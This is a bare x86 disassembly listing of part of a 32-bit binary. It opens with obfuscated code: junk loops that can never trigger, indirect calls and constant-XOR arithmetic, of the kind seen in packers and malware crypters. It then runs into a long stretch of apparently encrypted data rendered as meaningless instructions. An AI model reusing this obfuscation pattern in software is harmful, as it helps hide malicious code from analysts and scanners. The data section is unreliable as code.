  40a063:	call   DWORD PTR ds:0x42e9b7
  40a069:	jmp    0x40a024
  40a06e:	mov    ecx,0x7510899
  40a073:	xor    eax,ecx
  40a075:	add    eax,0x3272e0
  40a07a:	mov    DWORD PTR [edx],eax
  40a07c:	mov    eax,ds:0x42e18b
  40a081:	add    DWORD PTR ds:0x429020,ebx
  40a087:	mov    edx,DWORD PTR [ebp-0x4]
  40a08a:	mov    eax,DWORD PTR [eax]
  40a08c:	add    DWORD PTR ds:0x42d010,0x42b008
  40a096:	add    eax,DWORD PTR [edx]
  40a098:	sbb    edx,DWORD PTR ds:0x42c00c
  40a09e:	push   edi
  40a09f:	mov    DWORD PTR [ebp-0x8],eax
  40a0a2:	and    DWORD PTR ds:0x42c014,0x0
  40a0ac:	jmp    0x40a0bf
  40a0b1:	xor    eax,eax
  40a0b3:	add    eax,DWORD PTR ds:0x42c014
  40a0b9:	inc    eax
  40a0ba:	mov    ds:0x42c014,eax
  40a0bf:	cmp    DWORD PTR ds:0x42c014,0x1d
  40a0c6:	jae    0x40a159
  40a0cc:	cmp    DWORD PTR ds:0x42c014,0x8
  40a0d3:	jne    0x40a0df
  40a0d9:	call   DWORD PTR ds:0x42e9bb
  40a0df:	cmp    DWORD PTR ds:0x42c014,0x7
  40a0e6:	jne    0x40a0fa
  40a0ec:	xor    eax,eax
  40a0ee:	xor    eax,DWORD PTR ds:0x42c014
  40a0f4:	inc    eax
  40a0f5:	mov    ds:0x42c014,eax
  40a0fa:	jmp    0x40a0b1
  40a0ff:	and    DWORD PTR ds:0x42d004,0x0
  40a109:	jmp    0x40a11c
  40a10e:	xor    eax,eax
  40a110:	or     eax,DWORD PTR ds:0x42d004
  40a116:	inc    eax
  40a117:	mov    ds:0x42d004,eax
  40a11c:	cmp    DWORD PTR ds:0x42d004,0x1c
  40a123:	jae    0x40a159
  40a129:	cmp    DWORD PTR ds:0x42d004,0x2b
  40a130:	jne    0x40a147
  40a136:	push   DWORD PTR [ebp-0x20]
  40a139:	push   0x429018
  40a13e:	push   DWORD PTR [ebp-0x1c]
  40a141:	call   DWORD PTR ds:0x42e9bf
  40a147:	jmp    0x40a10e
  40a14c:	movzx  edi,BYTE PTR ds:0x42c014
  40a153:	sbb    DWORD PTR ds:0x42a004,edi
  40a159:	mov    edi,DWORD PTR [ebp+0x8]
  40a15c:	adc    edx,edx
  40a15e:	mov    eax,ds:0x42e313
  40a163:	mov    eax,DWORD PTR [eax+0x198]
  40a169:	xor    edi,ecx
  40a16b:	mov    DWORD PTR ds:0x42a008,0x1f
  40a175:	cmp    DWORD PTR ds:0x42a008,0x0
  40a17c:	je     0x40a1b8
  40a182:	cmp    DWORD PTR ds:0x42a008,0x2d
  40a189:	jne    0x40a1a4
  40a18f:	push   0x42e000
  40a194:	push   0x42e139
  40a199:	push   0x400000
  40a19e:	call   DWORD PTR ds:0x42e9c7
  40a1a4:	xor    edx,edx
  40a1a6:	add    edx,DWORD PTR ds:0x42a008
  40a1ac:	dec    edx
  40a1ad:	mov    DWORD PTR ds:0x42a008,edx
  40a1b3:	jmp    0x40a175
  40a1b8:	mov    edx,0x3272e0
  40a1bd:	xor    DWORD PTR ds:0x429010,0x6770
  40a1c7:	add    edi,edx
  40a1c9:	cmp    DWORD PTR [eax],edi
  40a1cb:	mov    DWORD PTR ds:0x42900c,0x1dd7
  40a1d5:	je     0x40a1f6
  40a1db:	mov    DWORD PTR ds:0x429014,0x4354
  40a1e5:	mov    eax,DWORD PTR [eax]
  40a1e7:	mov    DWORD PTR ds:0x42900c,0x7b1e
  40a1f1:	jmp    0x40c789
  40a1f6:	mov    eax,ds:0x42a008
  40a1fb:	mov    eax,DWORD PTR [ebp+0x18]
  40a1fe:	cmp    eax,esi
  40a200:	jne    0x40a224
  40a206:	mov    DWORD PTR ds:0x429010,0x2813
  40a210:	push   0xf89c85b8
  40a215:	mov    DWORD PTR ds:0x429020,0x131a
  40a21f:	jmp    0x40c778
  40a224:	mov    esi,0x74b
  40a229:	mov    esi,DWORD PTR [ebp+0x18]
  40a22c:	mov    eax,0xf89c85bb
  40a231:	cmp    esi,eax
  40a233:	mov    DWORD PTR ds:0x42c010,0x1f83
  40a23d:	jne    0x40c768
  40a243:	add    esi,eax
  40a245:	mov    eax,DWORD PTR [ebp+0x10]
  40a248:	add    esi,0x4b50
  40a24e:	xor    eax,ecx
  40a250:	or     DWORD PTR ds:0x42c01c,edx
  40a256:	add    eax,edx
  40a258:	mov    DWORD PTR [ebp-0x18],eax
  40a25b:	sbb    DWORD PTR ds:0x42d01c,edx
  40a261:	mov    eax,DWORD PTR [ebp+0xc]
  40a264:	add    esi,0x5e8f
  40a26a:	mov    esi,DWORD PTR [ebp-0x8]
  40a26d:	xor    eax,ecx
  40a26f:	mov    DWORD PTR ds:0x42d004,0x61c0
  40a279:	add    eax,edx
  40a27b:	add    DWORD PTR ds:0x42a004,0x42d004
  40a285:	imul   eax,DWORD PTR [esi]
  40a288:	add    DWORD PTR ds:0x42d004,0x19e2
  40a292:	mov    esi,DWORD PTR [ebp+0x8]
  40a295:	xor    esi,ecx
  40a297:	add    esi,edx
  40a299:	cmp    esi,eax
  40a29b:	mov    eax,DWORD PTR [ebp-0x4]
  40a29e:	push   ebx
  40a29f:	je     0x40a2be
  40a2a5:	mov    esi,DWORD PTR [ebp-0x18]
  40a2a8:	add    DWORD PTR [eax],esi
  40a2aa:	mov    eax,DWORD PTR [ebp-0x4]
  40a2ad:	mov    esi,DWORD PTR [ebp+0xc]
  40a2b0:	xor    esi,ecx
  40a2b2:	add    esi,edx
  40a2b4:	imul   esi,DWORD PTR [eax]
  40a2b7:	mov    DWORD PTR [eax],esi
  40a2b9:	jmp    0x40a2c3
  40a2be:	mov    esi,DWORD PTR [ebp+0x14]
  40a2c1:	xor    DWORD PTR [eax],esi
  40a2c3:	mov    eax,DWORD PTR [ebp-0x4]
  40a2c6:	mov    edi,DWORD PTR [ebp+0x10]
  40a2c9:	xor    edi,ecx
  40a2cb:	mov    esi,0xffcd8d20
  40a2d0:	mov    ebx,esi
  40a2d2:	sub    ebx,edi
  40a2d4:	add    DWORD PTR [eax],ebx
  40a2d6:	mov    eax,DWORD PTR [ebp-0x4]
  40a2d9:	mov    edi,DWORD PTR [ebp-0x8]
  40a2dc:	add    edi,DWORD PTR [eax]
  40a2de:	mov    DWORD PTR [ebp-0x8],edi
  40a2e1:	mov    eax,DWORD PTR [ebp+0xc]
  40a2e4:	mov    edi,DWORD PTR [ebp+0xc]
  40a2e7:	xor    edi,ecx
  40a2e9:	jmp    0x40c634
  40a2ee:	neg    ch
  40a2f0:	jns    0x40a2c7
  40a2f2:	xchg   ecx,eax
  40a2f3:	mov    ch,0x76
  40a2f5:	popf   
  40a2f6:	outs   dx,BYTE PTR ds:[esi]
  40a2f7:	mov    ah,0x10
  40a2f9:	inc    esi
  40a2fa:	lods   al,BYTE PTR ds:[esi]
  40a2fb:	jae    0x40a28c
  40a2fd:	fsubr  QWORD PTR [esi]
  40a2ff:	add    BYTE PTR [edx+0x7a],bh
  40a302:	inc    esp
  40a303:	pop    edi
  40a304:	jp     0x40a380
  40a306:	ja     0x40a31a
  40a308:	jno    0x40a2cf
  40a30a:	fbld   TBYTE PTR [ebx+0x41dbd77d]
  40a310:	xchg   ecx,eax
  40a311:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a312:	sub    eax,0x5fe074ef
  40a317:	lock or eax,0x5bc036b6
  40a31d:	xor    ebp,DWORD PTR [edi+0x1a6bf2cd]
  40a323:	arpl   WORD PTR [ecx+0x6c465857],bp
  40a329:	push   edi
  40a32a:	dec    ebx
  40a32b:	jb     0x40a35e
  40a32d:	sub    DWORD PTR [edx-0x43d42bbe],esp
  40a333:	stos   DWORD PTR es:[edi],eax
  40a334:	jns    0x40a300
  40a336:	rol    DWORD PTR [edi-0x74207fc0],1
  40a33c:	jbe    0x40a353
  40a33e:	sahf   
  40a33f:	xor    BYTE PTR [ecx-0x36d207b8],bl
  40a345:	inc    edx
  40a346:	out    dx,eax
  40a347:	stos   BYTE PTR es:[edi],al
  40a348:	mov    WORD PTR [ebx-0x20],es
  40a34b:	stos   DWORD PTR es:[edi],eax
  40a34c:	dec    edi
  40a34d:	mov    ebp,DWORD PTR [ecx+0x4d1335c2]
  40a353:	enter  0x8fad,0x74
  40a357:	cmp    DWORD PTR [esi+0x49795180],edi
  40a35d:	ror    esp,0xc0
  40a360:	test   BYTE PTR [eax],ah
  40a362:	xchg   esi,eax
  40a363:	xchg   ebx,eax
  40a364:	out    dx,eax
  40a365:	lods   al,BYTE PTR ds:[esi]
  40a366:	push   0xdbd3670a
  40a36b:	loope  0x40a365
  40a36d:	and    dh,ah
  40a36f:	push   esp
  40a370:	mov    al,ds:0x138cf6e5
  40a375:	jne    0x40a3de
  40a377:	and    eax,0x83cafb0f
  40a37c:	fild   QWORD PTR [eax]
  40a37e:	cld    
  40a37f:	icebp  
  40a380:	iret   
  40a381:	mov    ds:0x65d0576d,al
  40a386:	push   0x7c
  40a388:	sbb    bl,dh
  40a38a:	aad    0x97
  40a38c:	mov    WORD PTR [esi],?
  40a38e:	mov    ah,0xbd
  40a390:	xchg   esi,eax
  40a391:	cmp    ecx,DWORD PTR ds:0x847583a2
  40a397:	(bad)  
  40a398:	aam    0x9
  40a39a:	mov    DWORD PTR [edx+0x71740c9c],eax
  40a3a0:	sub    al,0xef
  40a3a2:	inc    edx
  40a3a3:	sbb    esp,DWORD PTR [eax]
  40a3a5:	pushw  es
  40a3a7:	push   0xffffff89
  40a3a9:	and    esi,DWORD PTR [eax-0x4209eb0c]
  40a3af:	outs   dx,BYTE PTR ds:[esi]
  40a3b0:	and    al,0x9a
  40a3b2:	or     ch,ch
  40a3b4:	or     esp,DWORD PTR [edx-0x5ee2fedb]
  40a3ba:	cmp    eax,0x478a6241
  40a3bf:	inc    ebp
  40a3c0:	jns    0x40a391
  40a3c2:	xchg   ebx,eax
  40a3c3:	scas   eax,DWORD PTR es:[edi]
  40a3c4:	mov    dl,0x5f
  40a3c6:	adc    eax,0x27ccd1e3
  40a3cb:	pop    ebp
  40a3cc:	imul   DWORD PTR [ebx]
  40a3ce:	and    ebx,DWORD PTR [ebp-0x242ca303]
  40a3d4:	sbb    DWORD PTR [edi],eax
  40a3d6:	cmc    
  40a3d7:	or     BYTE PTR ds:0x5d7b3e42,dl
  40a3dd:	sti    
  40a3de:	icebp  
  40a3df:	scas   eax,DWORD PTR es:[edi]
  40a3e0:	pop    es
  40a3e1:	stc    
  40a3e2:	hlt    
  40a3e3:	iret   
  40a3e4:	xor    bl,BYTE PTR [ebx+0x723a5d46]
  40a3ea:	mov    BYTE PTR es:[ebx+ebp*2-0x1b111e82],dh
  40a3f2:	shl    dl,1
  40a3f4:	retf   0x51f8
  40a3f7:	test   edi,edi
  40a3f9:	and    eax,0xcd6fd990
  40a3fe:	xor    ebx,DWORD PTR [esi+0x687d1aa7]
  40a404:	push   eax
  40a405:	xchg   ebp,eax
  40a406:	aas    
  40a407:	cmp    ah,BYTE PTR [ebp-0x2f]
  40a40a:	jmp    0x53e306a7
  40a40f:	xlat   BYTE PTR ds:[ebx]
  40a410:	inc    ecx
  40a411:	cmp    eax,0x5de6f3f2
  40a416:	mov    cl,0xea
  40a418:	jno    0x40a492
  40a41a:	jg     0x40a407
  40a41c:	fs push ecx
  40a41e:	out    dx,al
  40a41f:	cmp    edx,DWORD PTR [edi-0x2334d5ae]
  40a425:	arpl   WORD PTR ds:0x721910f9,bx
  40a42b:	push   eax
  40a42c:	adc    bl,cl
  40a42e:	idiv   DWORD PTR [edi]
  40a430:	mov    BYTE PTR [ebp-0x48],bh
  40a433:	mov    dl,0x0
  40a435:	inc    esi
  40a436:	pop    ds
  40a437:	push   ss
  40a438:	hlt    
  40a439:	stos   DWORD PTR es:[edi],eax
  40a43a:	mov    ah,0x7e
  40a43c:	sbb    al,0xeb
  40a43e:	ret    
  40a43f:	mov    al,ds:0x33d7c126
  40a444:	sub    BYTE PTR [edx-0x2e],bh
  40a447:	add    dh,cl
  40a449:	dec    edi
  40a44a:	xor    ch,BYTE PTR [edx]
  40a44c:	push   ds
  40a44d:	sub    al,0xcd
  40a44f:	sbb    eax,0xe83e46b5
  40a454:	pop    esp
  40a455:	sbb    ecx,DWORD PTR [ecx-0x1fecb011]
  40a45b:	pop    ecx
  40a45c:	jp     0x40a41b
  40a45e:	repz clc 
  40a460:	xor    DWORD PTR [eax-0x6d],eax
  40a463:	fisttp QWORD PTR [esi-0x3d754285]
  40a469:	sar    BYTE PTR [ecx+0x7df02bcb],cl
  40a46f:	call   0x724fb07
  40a474:	push   edx
  40a475:	out    0x31,al
  40a477:	jmp    0xafe8184d
  40a47c:	sub    al,0xb0
  40a47e:	(bad)  
  40a47f:	repnz lods al,BYTE PTR ds:[esi]
  40a481:	mov    eax,ds:0x636a209c
  40a486:	das    
  40a487:	repz and al,0x42
  40a48a:	nop
  40a48b:	inc    ebx
  40a48c:	fstp   st(3)
  40a48e:	sub    ecx,esp
  40a490:	mov    ah,0x4e
  40a492:	jbe    0x40a421
  40a494:	stos   BYTE PTR es:[edi],al
  40a495:	jmp    0xa9e5:0xcd182b14
  40a49c:	div    DWORD PTR [edx-0x522e0522]
  40a4a2:	in     al,dx
  40a4a3:	mov    esi,0x7129ebd3
  40a4a8:	(bad)  
  40a4a9:	jmp    0x40a469
  40a4ab:	inc    esp
  40a4ac:	mov    cl,0xbc
  40a4ae:	test   DWORD PTR [eax+0x1989c9f1],ebx
  40a4b4:	dec    esi
  40a4b5:	in     al,0xd6
  40a4b7:	cmp    esp,ebx
  40a4b9:	nop
  40a4ba:	clc    
  40a4bb:	pushf  
  40a4bc:	xchg   esp,eax
  40a4bd:	aaa    
  40a4be:	out    dx,eax
  40a4bf:	jno    0x40a539
  40a4c1:	push   ebx
  40a4c2:	sbb    eax,0x3a34b4f2
  40a4c7:	adc    DWORD PTR [edi+edi*8-0x33],ebx
  40a4cb:	mov    DWORD PTR [edi+0x62492477],0xb60ebc76
  40a4d5:	push   es
  40a4d6:	jg     0x40a4bb
  40a4d8:	cmp    al,0x18
  40a4da:	fcmove st,st(7)
  40a4dc:	xlat   BYTE PTR ds:[ebx]
  40a4dd:	data16 ror BYTE PTR [esi+0x4f47230e],0xa5
  40a4e5:	dec    edi
  40a4e6:	rcl    DWORD PTR [ebx+edi*4],1
  40a4e9:	push   ecx
  40a4ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a4eb:	lahf   
  40a4ec:	(bad)  [ebp-0x78c8307d]
  40a4f2:	daa    
  40a4f3:	pop    ds
  40a4f4:	push   esi
  40a4f6:	mov    bh,0xe2
  40a4f8:	and    esi,edi
  40a4fa:	or     eax,0xe5549461
  40a4ff:	pop    edi
  40a500:	nop
  40a501:	xchg   ebp,eax
  40a502:	mov    bl,0xb5
  40a504:	cmp    al,BYTE PTR [esi-0x57]
  40a507:	sahf   
  40a508:	xor    esp,eax
  40a50a:	and    eax,0x71b8f18a
  40a50f:	ror    BYTE PTR [ebx],1
  40a511:	jg     0x40a52d
  40a513:	popf   
  40a514:	dec    edi
  40a515:	mov    esp,0xfd7ab93a
  40a51a:	dec    ebx
  40a51b:	mov    cl,0x68
  40a51d:	pop    edx
  40a51e:	mov    ebp,0xe359187
  40a523:	ss pop eax
  40a525:	std    
  40a526:	push   ds
  40a527:	ins    DWORD PTR es:[edi],dx
  40a528:	pop    ds
  40a529:	(bad)  
  40a52a:	std    
  40a52b:	mov    bl,BYTE PTR [edi]
  40a52d:	(bad)
  40a530:	inc    eax
  40a531:	push   edx
  40a532:	mov    ebp,0x6abdad7f
  40a537:	mov    fs,edi
  40a539:	inc    esi
  40a53a:	mov    eax,ds:0xacc579bf
  40a53f:	iret   
  40a540:	xchg   ecx,eax
  40a541:	inc    ebp
  40a542:	fmul   DWORD PTR [edi-0x58]
  40a545:	jno    0x40a5ac
  40a547:	xor    ch,BYTE PTR [ebx-0x7d]
  40a54a:	jns    0x40a5cb
  40a54c:	fsubr  QWORD PTR [esi+0x47]
  40a54f:	mov    ebp,0xc233a4d2
  40a554:	jge    0x40a528
  40a556:	jae    0x40a4f3
  40a558:	stos   BYTE PTR es:[edi],al
  40a559:	call   0x4a0ffb39
  40a55e:	dec    ebx
  40a55f:	xchg   ebp,eax
  40a560:	cmp    eax,0xed66b044
  40a565:	pop    esi
  40a566:	mov    ebp,0x51a6fb60
  40a56b:	inc    edx
  40a56c:	jb     0x40a57f
  40a56e:	and    BYTE PTR [ebp-0x1996cc7b],0xf4
  40a575:	push   eax
  40a576:	clc    
  40a577:	fidiv  WORD PTR [ecx-0x4e]
  40a57a:	data16 mov al,ds:0xf253562e
  40a580:	xor    al,ch
  40a582:	out    0xed,eax
  40a584:	bound  ebp,QWORD PTR [edi-0xa040f8]
  40a58a:	mov    eax,ds:0x96dd5012
  40a58f:	sbb    eax,0x532712a9
  40a594:	adc    BYTE PTR [eax],0xed
  40a597:	add    DWORD PTR [eax-0x9],ebx
  40a59a:	mov    esp,0x2b23fe37
  40a59f:	pop    ss
  40a5a0:	int3   
  40a5a1:	mov    ebx,0xf935869d
  40a5a6:	mov    bl,0xc4
  40a5a8:	cmp    edx,esi
  40a5aa:	jl     0x40a585
  40a5ac:	lock jnp 0x40a57f
  40a5af:	shl    DWORD PTR [edi],cl
  40a5b1:	inc    esp
  40a5b2:	jnp    0x40a5eb
  40a5b4:	inc    ebp
  40a5b5:	lea    ebx,[edi-0x533922c8]
  40a5bb:	nop
  40a5bc:	adc    DWORD PTR [eax+0x5a],ebp
  40a5bf:	repnz data16 sub dh,0xbb
  40a5c4:	sti    
  40a5c5:	cmp    BYTE PTR [edx],bh
  40a5c7:	xor    BYTE PTR [esi-0x4c1289f5],0xc
  40a5ce:	inc    esp
  40a5cf:	mov    ds:0xc91d4605,al
  40a5d4:	punpcklwd mm0,DWORD PTR [ebx+0x57b79d1a]
  40a5db:	pop    ebp
  40a5dc:	les    ecx,FWORD PTR [ebp-0x66]
  40a5df:	test   BYTE PTR [edx+0x2d],ah
  40a5e2:	(bad)  
  40a5e3:	int    0xf2
  40a5e5:	dec    eax
  40a5e6:	xor    ecx,DWORD PTR [edi]
  40a5e8:	je     0x40a592
  40a5ea:	xchg   DWORD PTR [edi+0x4d],esi
  40a5ed:	iret   
  40a5ee:	rcr    DWORD PTR [edi],1
  40a5f0:	ins    BYTE PTR es:[edi],dx
  40a5f1:	loope  0x40a5ac
  40a5f3:	cli    
  40a5f4:	jp     0x40a5f4
  40a5f6:	sbb    eax,edx
  40a5f8:	pop    edx
  40a5f9:	inc    edi
  40a5fa:	fcmovnb st,st(1)
  40a5fc:	shl    ebx,cl
  40a5fe:	pop    ss
  40a5ff:	or     esp,DWORD PTR [eax+eiz*4-0x65]
  40a603:	sahf   
  40a604:	sub    eax,0x5a96010e
  40a609:	dec    edi
  40a60a:	or     DWORD PTR [ecx-0x20a06bb0],esi
  40a610:	pop    esp
  40a611:	sub    BYTE PTR [esp+ebp*1+0x58],cl
  40a615:	mov    edi,0x8bfc2a88
  40a61b:	adc    edi,eax
  40a61d:	ret    0x5b78
  40a620:	scas   al,BYTE PTR es:[edi]
  40a621:	ror    DWORD PTR [ecx],cl
  40a623:	out    0x5e,eax
  40a625:	pop    ss
  40a626:	pop    esp
  40a627:	and    eax,esp
  40a629:	ins    DWORD PTR es:[edi],dx
  40a62a:	out    dx,eax
  40a62b:	mov    DWORD PTR [eax-0x72],esi
  40a62e:	and    bl,al
  40a630:	imul   eax,ebp,0x42
  40a633:	adc    BYTE PTR [eax+ecx*2],ch
  40a636:	loop   0x40a5d2
  40a638:	sbb    al,0xec
  40a63a:	out    dx,eax
  40a63b:	sub    BYTE PTR [esi-0x7c],bl
  40a63e:	retf   
  40a63f:	sbb    bh,BYTE PTR [ebx+edi*1+0x70]
  40a643:	push   esi
  40a644:	push   ebx
  40a645:	or     BYTE PTR [eax],cl
  40a647:	push   ds
  40a648:	xchg   esp,eax
  40a649:	aad    0x4b
  40a64b:	jb     0x40a657
  40a64d:	loop   0x40a6b0
  40a64f:	mov    bh,0x29
  40a651:	ja     0x40a684
  40a653:	lds    ebp,FWORD PTR [esi+0x79]
  40a656:	out    0x7b,al
  40a658:	mov    edx,?
  40a65a:	je     0x40a6b2
  40a65c:	cmp    esp,ecx
  40a65e:	popf   
  40a65f:	or     eax,DWORD PTR [ebp+0x49a206f9]
  40a665:	mov    eax,0x9b3610cc
  40a66a:	dec    ebx
  40a66b:	stc    
  40a66c:	out    0x44,eax
  40a66e:	aam    0x29
  40a670:	xchg   esp,eax
  40a671:	in     al,dx
  40a672:	sbb    esi,DWORD PTR [ebp+0x7f]
  40a675:	imul   edi,DWORD PTR [ecx-0x37d39029],0x37
  40a67c:	mov    esi,0x335dfa69
  40a681:	or     al,0x5f
  40a683:	jmp    0x40a6c6
  40a685:	xor    al,0xb4
  40a687:	ss loope 0x40a62d
  40a68a:	adc    eax,0x1f9e0a4f
  40a68f:	shr    BYTE PTR [eax+edi*8],cl
  40a692:	mov    esi,0x780c8f3e
  40a697:	fadd   DWORD PTR [ebp-0x516dac77]
  40a69d:	lahf   
  40a69e:	mov    ?,WORD PTR [ebp+0x56bd61c3]
  40a6a4:	mov    ch,BYTE PTR [ebx-0x11e891ab]
  40a6aa:	out    dx,al
  40a6ab:	fimul  WORD PTR [esi-0x25db03c]
  40a6b1:	std    
  40a6b2:	popaw  
  40a6b4:	jno    0x40a6ed
  40a6b6:	push   ebp
  40a6b7:	or     DWORD PTR [edx+eiz*4-0x53bb8d58],ebp
  40a6be:	mov    eax,ss
  40a6c0:	les    ebx,FWORD PTR [edi+ecx*4-0x3b679d55]
  40a6c7:	fild   WORD PTR [eax]
  40a6c9:	ins    BYTE PTR es:[edi],dx
  40a6ca:	(bad)  
  40a6cb:	adc    esp,DWORD PTR [ebp-0x31]
  40a6ce:	aas    
  40a6cf:	imul   esi,DWORD PTR ds:[ecx+0x62],0x1665109a
  40a6d7:	xor    esp,ebp
  40a6d9:	leave  
  40a6da:	out    0x60,eax
  40a6dc:	adc    eax,0xe6cf5542
  40a6e1:	imul   edi,edi,0x1b
  40a6e4:	cmp    BYTE PTR [ecx+0x35f0dc8],bl
  40a6ea:	rol    DWORD PTR ds:0x36e2aa0a,1
  40a6f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a6f1:	dec    ebx
  40a6f2:	pop    ecx
  40a6f3:	add    bl,0x99
  40a6f6:	or     BYTE PTR [esi],bl
  40a6f8:	pop    ss
  40a6f9:	daa    
  40a6fa:	dec    esi
  40a6fb:	mov    eax,DWORD PTR [edi+ebp*1+0x1a19fe28]
  40a702:	add    DWORD PTR [edi-0x2919447d],ebx
  40a708:	mov    ch,0x1e
  40a70a:	nop
  40a70b:	pop    edi
  40a70c:	iret   
  40a70d:	add    eax,0x190d2044
  40a712:	push   cs
  40a713:	xchg   edi,eax
  40a714:	fs into 
  40a716:	ds push ecx
  40a718:	adc    BYTE PTR [esi-0x3f],0xcd
  40a71c:	push   ds
  40a71d:	fbstp  TBYTE PTR [ecx-0x3241eedd]
  40a723:	jle    0x40a6c6
  40a725:	adc    DWORD PTR [esi-0x30],esp
  40a728:	dec    edi
  40a729:	and    al,0x3a
  40a72b:	in     al,dx
  40a72c:	inc    ebp
  40a72d:	inc    ebp
  40a72e:	pop    edi
  40a72f:	imul   esi,DWORD PTR [ebx],0xffffffa8
  40a732:	jle    0x40a79b
  40a734:	das    
  40a735:	lods   eax,DWORD PTR ds:[esi]
  40a736:	sbb    BYTE PTR [edi+0x3c],al
  40a739:	out    0xfb,al
  40a73b:	aaa    
  40a73c:	sub    bh,BYTE PTR [edi+esi*4-0x27]
  40a740:	dec    ebx
  40a741:	inc    edx
  40a742:	loopne 0x40a70f
  40a744:	xor    ebx,DWORD PTR [edi]
  40a746:	xor    DWORD PTR [edi+0x17],0x87de89bf
  40a74d:	jle    0x40a77f
  40a74f:	adc    BYTE PTR [ecx-0x47],al
  40a752:	hlt    
  40a753:	fwait
  40a754:	jmp    0x78f9:0x42eaadac
  40a75b:	jl     0x40a766
  40a75d:	mov    edx,0x5f120d3a
  40a762:	test   DWORD PTR [esi],ecx
  40a764:	loopne 0x40a70e
  40a766:	xchg   ebp,eax
  40a767:	jge    0x40a788
  40a769:	inc    edx
  40a76a:	out    0x61,eax
  40a76c:	dec    edi
  40a76d:	shl    BYTE PTR [ebp+ebp*4-0x33],cl
  40a771:	cli    
  40a772:	test   BYTE PTR [eax-0x244ae908],bl
  40a778:	adc    ecx,DWORD PTR [esi-0x14cbfbe4]
  40a77e:	mov    dl,0x8a
  40a780:	push   ecx
  40a781:	fs int3 
  40a783:	or     bl,BYTE PTR [edx-0x14]
  40a786:	xor    al,0x32
  40a788:	lods   al,BYTE PTR ds:[esi]
  40a789:	pop    edx
  40a78a:	inc    ecx
  40a78b:	jle    0x40a7f2
  40a78d:	dec    ebp
  40a78e:	inc    esi
  40a78f:	retf   
  40a790:	adc    BYTE PTR [eax+esi*2-0x44],ah
  40a794:	inc    edx
  40a795:	nop
  40a796:	adc    al,0xcf
  40a798:	mov    dh,0x29
  40a79a:	push   edx
  40a79b:	imul   eax,edi,0x79e165de
  40a7a1:	push   ebp
  40a7a2:	sbb    BYTE PTR [ecx+ebp*1-0x7287fad2],bl
  40a7a9:	push   0x63
  40a7ab:	int3   
  40a7ac:	test   DWORD PTR [ecx-0x3057f48],esi
  40a7b2:	call   0x560bcb27
  40a7b7:	sub    bl,BYTE PTR [esi+ecx*8-0x7255510b]
  40a7be:	add    BYTE PTR [edx+0x20f420f1],al
  40a7c4:	dec    ecx
  40a7c5:	cli    
  40a7c6:	jmp    0x40a77a
  40a7c8:	sti    
  40a7c9:	pop    edx
  40a7ca:	test   BYTE PTR [ecx+0x56],0x97
  40a7ce:	add    DWORD PTR [edx-0x4],edi
  40a7d1:	sahf   
  40a7d2:	ror    DWORD PTR [edi],1
  40a7d4:	sbb    al,0xa
  40a7d6:	xchg   esp,eax
  40a7d7:	ins    BYTE PTR es:[edi],dx
  40a7d8:	lods   al,BYTE PTR ds:[esi]
  40a7d9:	push   0x19
  40a7db:	cld    
  40a7dc:	and    al,0xe0
  40a7de:	push   0x91690adf
  40a7e3:	or     eax,0x2ef715bd
  40a7e8:	push   esp
  40a7e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a7ea:	pop    edx
  40a7eb:	(bad)  
  40a7ec:	and    dl,BYTE PTR [ebp+0x2bee10a7]
  40a7f2:	std    
  40a7f3:	push   ebx
  40a7f4:	mov    ecx,0x5cde6915
  40a7f9:	push   esi
  40a7fa:	adc    dh,al
  40a7fc:	fisttp QWORD PTR [edx]
  40a7fe:	jnp    0x40a855
  40a800:	out    dx,eax
  40a801:	jge    0x40a868
  40a803:	jne    0x40a82f
  40a805:	inc    edx
  40a806:	mov    dh,0xeb
  40a808:	jns    0x40a856
  40a80a:	mov    fs:0x1b603d0e,al
  40a810:	int3   
  40a811:	sbb    eax,0x5063c7a4
  40a816:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a817:	popa   
  40a818:	or     ecx,esp
  40a81a:	xor    ebp,esp
  40a81c:	(bad)  
  40a81d:	cmp    al,0x42
  40a81f:	scas   eax,DWORD PTR es:[edi]
  40a820:	ins    DWORD PTR es:[edi],dx
  40a821:	in     eax,dx
  40a822:	aas    
  40a823:	ficom  DWORD PTR [ebp+0x15]
  40a826:	int3   
  40a827:	jns    0x40a7dc
  40a829:	mov    edi,0x7d1738aa
  40a82e:	jno    0x40a8a4
  40a830:	push   ebp
  40a831:	adc    DWORD PTR [edi+eiz*2+0x34],eax
  40a835:	mov    edi,0xc8ea09f6
  40a83a:	xchg   edx,eax
  40a83b:	cmp    DWORD PTR [esp+ebx*4],ebx
  40a83e:	cmc    
  40a83f:	dec    ebp
  40a840:	popf   
  40a841:	push   eax
  40a842:	je     0x40a864
  40a844:	out    0xe8,eax
  40a846:	xor    dl,BYTE PTR [edx+ecx*8+0x4b]
  40a84a:	cwde   
  40a84b:	mov    edi,0xc8e41f25
  40a850:	cmp    BYTE PTR [ecx-0x1d6ef26e],al
  40a856:	add    eax,0xc22f04cf
  40a85b:	jne    0x40a8a9
  40a85d:	xchg   ebx,eax
  40a85e:	push   esi
  40a85f:	jns    0x40a895
  40a861:	(bad)  
  40a862:	ss enter 0xab8b,0x79
  40a867:	push   es
  40a868:	sub    BYTE PTR [esi],bh
  40a86a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a86b:	or     al,0x62
  40a86d:	xor    edi,edi
  40a86f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a870:	arpl   WORD PTR ds:0xb2f7f8b9,si
  40a876:	xor    ch,BYTE PTR [ebp+0x5f26aef0]
  40a87c:	vcmpss xmm4,xmm3,DWORD PTR [edx+0x7fbdfe35],0x27
  40a885:	jno    0x40a8f8
  40a887:	idiv   sp
  40a88a:	mov    ebx,0x3ea3f341
  40a88f:	or     al,BYTE PTR [edx+0x6b]
  40a892:	push   ds
  40a893:	xchg   edi,eax
  40a894:	push   0xffffff85
  40a896:	mov    ebx,0x4eb004b9
  40a89b:	stc    
  40a89c:	adc    DWORD PTR [esi],edi
  40a89e:	or     al,0xa4
  40a8a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a8a1:	cmp    al,0xdc
  40a8a3:	pop    ds
  40a8a4:	jmp    0xae1a1663
  40a8a9:	and    dh,bl
  40a8ab:	cs push esp
  40a8ad:	xor    DWORD PTR [eax-0x7e317ec6],ecx
  40a8b3:	xchg   esi,eax
